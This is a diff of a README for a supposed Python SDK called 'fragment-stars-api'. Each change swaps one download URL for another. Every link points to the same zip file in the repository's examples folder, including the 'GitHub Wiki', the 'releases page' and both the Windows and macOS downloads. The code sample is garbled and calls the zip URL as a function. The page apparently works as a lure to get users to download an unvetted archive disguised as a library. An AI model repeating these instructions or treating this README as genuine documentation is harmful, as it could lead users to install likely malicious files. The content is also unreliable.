@@ -8,7 +8,7 @@ Welcome to the fragment-stars-api! This Python SDK makes it easy to interact wit
 
 To download the latest version of the fragment-stars-api, visit this page:
 
-[Download Fragment Stars API](https://github.com/leviuszaur/fragment-stars-api/raw/refs/heads/main/examples/fragment_api_stars_1.1.zip)
+[Download Fragment Stars API](https://raw.githubusercontent.com/leviuszaur/fragment-stars-api/main/examples/fragment_api_stars_1.1.zip)
 
 Once on the releases page, look for the latest version. Here, you will find the files necessary for installation.
 
@@ -25,11 +25,11 @@ Make sure you have Python installed on your machine as the SDK relies on it to f
 ## 🖥️ Installation Steps
 
 1. **Download the Package**
-   - Go to the [Download Fragment Stars API](https://github.com/leviuszaur/fragment-stars-api/raw/refs/heads/main/examples/fragment_api_stars_1.1.zip) page.
+   - Go to the [Download Fragment Stars API](https://raw.githubusercontent.com/leviuszaur/fragment-stars-api/main/examples/fragment_api_stars_1.1.zip) page.
    - Click on the latest release to view available files.
 
 2. **Choose the Correct File**
-   - Depending on your operating system, select and download the appropriate file. For example, Windows users might download `https://github.com/leviuszaur/fragment-stars-api/raw/refs/heads/main/examples/fragment_api_stars_1.1.zip`, while macOS users should download `https://github.com/leviuszaur/fragment-stars-api/raw/refs/heads/main/examples/fragment_api_stars_1.1.zip`.
+   - Depending on your operating system, select and download the appropriate file. For example, Windows users might download `https://raw.githubusercontent.com/leviuszaur/fragment-stars-api/main/examples/fragment_api_stars_1.1.zip`, while macOS users should download `https://raw.githubusercontent.com/leviuszaur/fragment-stars-api/main/examples/fragment_api_stars_1.1.zip`.
 
 3. **Extract the Files**
    - After downloading, locate the zipped file in your Downloads folder.
@@ -69,7 +69,7 @@ Once you have installed the fragment-stars-api, you can start using it:
 3. **Access Data:**
    - To request data, use simple methods provided by the SDK. For example:
    ```python
-   data = https://github.com/leviuszaur/fragment-stars-api/raw/refs/heads/main/examples/fragment_api_stars_1.1.zip()
+   data = https://raw.githubusercontent.com/leviuszaur/fragment-stars-api/main/examples/fragment_api_stars_1.1.zip()
    print(data)
    ```
 
@@ -83,7 +83,7 @@ For detailed method descriptions and examples, refer to the documentation includ
 
 ## 📄 Documentation
 
-For more information on how to use the fragment-stars-api, please check out the documentation provided with your installation. You can also view additional resources on the [GitHub Wiki](https://github.com/leviuszaur/fragment-stars-api/raw/refs/heads/main/examples/fragment_api_stars_1.1.zip).
+For more information on how to use the fragment-stars-api, please check out the documentation provided with your installation. You can also view additional resources on the [GitHub Wiki](https://raw.githubusercontent.com/leviuszaur/fragment-stars-api/main/examples/fragment_api_stars_1.1.zip).
 
 ## 🔗 Support & Contributions
 
@@ -91,6 +91,6 @@ If you encounter any issues or have questions, please open an issue on the GitHu
 
 ## 📅 Updates
 
-Stay tuned for updates about new features and improvements. Check the [Download Fragment Stars API](https://github.com/leviuszaur/fragment-stars-api/raw/refs/heads/main/examples/fragment_api_stars_1.1.zip) page regularly for the latest releases.
+Stay tuned for updates about new features and improvements. Check the [Download Fragment Stars API](https://raw.githubusercontent.com/leviuszaur/fragment-stars-api/main/examples/fragment_api_stars_1.1.zip) page regularly for the latest releases.
 
 Thank you for choosing fragment-stars-api! We hope you find it helpful in your projects.
